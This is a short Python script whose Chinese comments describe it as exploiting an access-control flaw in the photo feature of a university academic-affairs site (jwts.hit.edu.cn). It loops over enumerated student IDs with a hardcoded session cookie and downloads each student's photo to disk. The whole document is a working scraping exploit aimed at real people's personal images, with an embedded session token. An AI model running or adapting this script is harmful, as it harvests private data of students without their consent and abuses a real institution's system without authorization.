# -*- coding: utf-8 -*-
#利用了教务处显示照片功能的越权访问漏洞，任意登录用户可访问其他用户的photo
import requests
from  sys import getsizeof

url = "http://jwts.hit.edu.cn/xswhxx/showPhoto"

Department = '11401'   #学号中的入学年份级院系号
sid = 'TMSkZTHhN2BVlzvJ6w5h93LmCgGfvsGj1hCTw15yH46Tcr1XSfhc!203545625' #当前登录用户的sid，根据自己的修改

for major in range(1, 8):  #专业号
    for class_ in range(1, 8):   #班级号
        for number_ in range(1, 30):  #班级内编号
            ID = Department + str(major) + str(class_).rjust(2, '0') + str(number_).rjust(2, '0')
            #print(ID)
            payload = {'xh': ID}
            headers = {'Host': 'jwts.hit.edu.cn',
                        'Cookie': 'name=value; UM_distinctid=15ba00a9ef818d-0163d1310cdcab-3e6e4647-11cc40-15ba00a9ef949f; _ga=GA1.3.167644283.1494410335; JSESSIONID='+sid+'; clwz_blc_pst=134221996.24859; name=value',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1'}
            r = requests.get(url, params=payload, headers=headers)
            if r.status_code == 200 and getsizeof(r.content)>5000:
                print(ID)
                open('E:/photos/'+ID + '.png', 'wb').write(r.content) #向文件中写入二进制，注意修改成自己的地址
